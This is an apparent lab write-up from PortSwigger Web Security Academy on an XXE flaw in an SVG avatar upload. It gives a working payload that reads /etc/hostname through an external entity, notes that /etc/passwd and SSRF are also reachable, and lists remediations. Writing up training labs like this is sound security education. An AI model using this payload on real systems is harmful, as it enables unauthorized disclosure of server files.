# XXE via SVG File Upload – Local File Disclosure

## Summary

An XXE vulnerability was found in the avatar upload feature. The application processes SVG files without disabling external entities, allowing local file contents to be rendered in the uploaded image.

**Severity:** High  
**CWE:** CWE-611

---

## Technical Details

- **Endpoint:** Blog comment avatar upload
- **Accepted Format:** SVG (XML-based)
- **Flaw:** XML parser allows external entity processing

---

## Proof of Concept

### Malicious SVG Payload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
    <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### Execution

1. Created the above SVG locally
2. Uploaded it as a comment avatar
3. The rendered image displayed the server's hostname from `/etc/hostname`

> **[Screenshot 2: Comment page showing hostname visible inside the rendered SVG avatar]**
!(./images/final.png)  

---

## Impact

- Read arbitrary server files (`/etc/passwd`, configs, source code)
- Potential SSRF via `http://` entity references

---

## Remediation

1. Disable DTD and external entity processing in the XML parser
2. Rasterize SVG uploads to PNG/JPEG server-side
3. Sanitize SVG content with an allowlist-based library

---

*PortSwigger Web Security Academy lab.*
